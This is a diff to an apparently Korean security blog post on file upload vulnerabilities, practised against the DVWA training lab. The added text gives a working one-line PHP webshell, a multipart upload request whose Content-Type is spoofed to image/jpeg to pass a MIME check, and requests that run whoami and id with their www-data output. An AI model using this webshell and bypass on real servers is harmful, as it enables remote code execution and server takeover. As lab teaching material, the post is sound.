@@ -9,8 +9,6 @@ categories: [웹 해킹]
 
 파일 업로드 취약점은 서버 측에서 업로드되는 파일의 확장자나 내용을 제대로 검증하지 않을 때 발생한다. 공격자는 이 취약점을 이용해 악의적인 스크립트 파일(웹쉘)을 서버에 업로드하여 원격에서 시스템 명령어를 실행(RCE)하고 최종적으로 서버의 제어권을 획득할 수 있다.
 
-이 공격은 [A04: 안전하지 않은 설계](https://hamap0.github.io/projects/owasp-top-10/2025/08/28/A04_Insecure-Design.html) 프로젝트 보고서에서 다룬 핵심 주제이다.
-
 ---
 
 ### 2. 주요 우회 기법
@@ -40,7 +38,22 @@ categories: [웹 해킹]
   }
 ?>
 ```
-   ![FileuploadWebshell](/assets/images/FUpload_1.png)
+
+이 파일을 `shell.php`로 저장해 업로드하고, 다음과 같이 접근하면 명령어가 실행된다:
+
+```
+GET /hackable/uploads/shell.php?cmd=whoami HTTP/1.1
+Host: dvwa.local
+```
+
+서버 응답은 다음과 같이 `www-data`를 포함한다:
+
+```
+HTTP/1.1 200 OK
+...
+
+www-data
+```
 
 #### **개선된 웹쉘 (간이 파일 브라우저)**
 조금 더 발전된 형태의 웹쉘은 단순히 명령어를 실행하는 것을 넘어 서버의 파일 시스템을 탐색하는 기능을 포함할 수 있다. 아래 코드는 `path` 파라미터로 전달된 경로의 파일과 디렉터리 목록을 보여주는 간단한 파일 브라우저 역할을 한다.
@@ -67,31 +80,45 @@ categories: [웹 해킹]
 
 ### 4. 사용 예시: Burp Suite를 이용한 MIME 타입 우회
 
-이 예시는 서버가 `Content-Type` 헤더를 신뢰할 때 발생하는 파일 업로드 취약점을 공격하는 과정을 보여준다.
+서버가 `Content-Type` 헤더만 검증한다면, 공격자는 이를 조작해 PHP 파일을 업로드할 수 있다.
 
-#### **1. 요청 가로채기 (Intercept)**
-1.  `shell.php` 파일을 준비하고 Burp Suite와 브라우저 프록시를 설정한다.
-2.  Burp Suite의 `Proxy` > `Intercept` 탭을 `On` 상태로 설정한다.
-3.  DVWA의 `File Upload` 페이지에서 `shell.php` 파일을 선택하고 `Upload` 버튼을 클릭하여 요청을 가로챈다.
+#### **1. 원본 요청 (차단됨)**
+```http
+POST /vulnerabilities/upload/ HTTP/1.1
+Host: dvwa.local
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...
 
-#### **2. Content-Type 헤더 변조**
-1.  가로챈 `POST` 요청 패킷에서 `Content-Type` 헤더를 확인한다. 초기 값은 `application/x-php`로 설정되어 있다.
-    ```http
-    ...
-    Content-Disposition: form-data; name="uploaded"; filename="shell.php"
-    Content-Type: application/x-php
+------WebKitFormBoundary...
+Content-Disposition: form-data; name="uploaded"; filename="shell.php"
+Content-Type: application/x-php
 
-    <?php system($_GET['cmd']); ?>
-    ...
-    ```
-2.  `Content-Type: application/x-php` 라인을 `Content-Type: image/jpeg`로 수정한다.
-3.  `Forward` 버튼을 눌러 변조된 요청을 서버로 전송한다.
+<?php system($_GET['cmd']); ?>
+------WebKitFormBoundary...
+```
+→ 이 요청은 대부분의 필터에서 차단된다.
 
-#### **3. 업로드 확인 및 웹쉘 실행**
-1.  서버의 필터링 로직이 `Content-Type`만 검증했다면 파일은 정상적으로 업로드되고 저장 경로(예: `../../hackable/uploads/shell.php`)가 출력된다.
-2.  브라우저에서 해당 경로에 `?cmd=whoami` 파라미터를 추가하여 접속한다.
-3.  화면에 `www-data`가 출력되면 웹쉘 업로드 및 명령어 실행에 성공한 것이다.
-   ![FileuploadBurp](/assets/images/Fupload_2.png)
+#### **2. 변조된 요청 (우회 성공)**
+Burp Suite에서 `Content-Type`을 `image/jpeg`로 수정:
+
+```http
+Content-Disposition: form-data; name="uploaded"; filename="shell.php"
+Content-Type: image/jpeg   ← 여기만 바뀜!
+```
+
+이 요청을 전송하면 서버가 "이건 이미지야"라고 판단해 파일을 저장한다.
+
+#### **3. 웹쉘 실행 확인**
+업로드 후, 다음 URL로 접근:
+
+```
+http://dvwa.local/hackable/uploads/shell.php?cmd=id
+```
+
+응답 본문에 다음이 출력되면 성공:
+
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
 ---
 
